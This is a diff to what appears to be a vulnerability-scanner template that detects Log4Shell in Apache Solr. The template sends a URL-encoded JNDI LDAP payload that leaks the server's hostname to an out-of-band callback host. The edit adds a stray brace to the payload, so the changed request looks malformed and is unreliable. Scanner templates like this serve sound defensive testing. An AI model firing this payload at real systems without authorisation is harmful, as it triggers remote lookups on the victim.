@@ -35,7 +35,7 @@ http:
   raw:
   - '@timeout: 25s
 
-    GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D
+    GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D
     HTTP/1.1
 
     Host: {{Hostname}}
@@ -45,11 +45,10 @@ id: apache-solr-log4j-rce
 info:
   author: Evan Rubinstein,nvn1729,j4vaovo
   classification:
-    cpe: cpe:2.3:a:apache:solr:*:*:*:*:*:*:*:*
     cve-id: CVE-2021-44228
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77,CWE-917,CWE-94
+    cwe-id: CWE-77
   description: 'Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages,
     and parameters do not protect against attacker controlled LDAP and other JNDI
     related endpoints. This vulnerability affects Solr 7+.
@@ -57,10 +56,7 @@ info:
     '
   metadata:
     max-request: 2
-    product: solr
-    runzero-review: REJECT/2025-11-07/uses interactsh
     shodan-query: http.html:"Apache Solr"
-    vendor: apache
     verified: true
   name: Apache Solr 7+ - Remote Code Execution (Apache Log4j)
   reference:
@@ -71,7 +67,7 @@ info:
   - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
   - https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228
   severity: critical
-  tags: apache,cve,cve2021,jndi,kev,log4j,oast,rce,solr,vulhub,vuln
+  tags: vulhub,cve,solr,oast,log4j,cve2021,rce,apache,jndi,kev
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
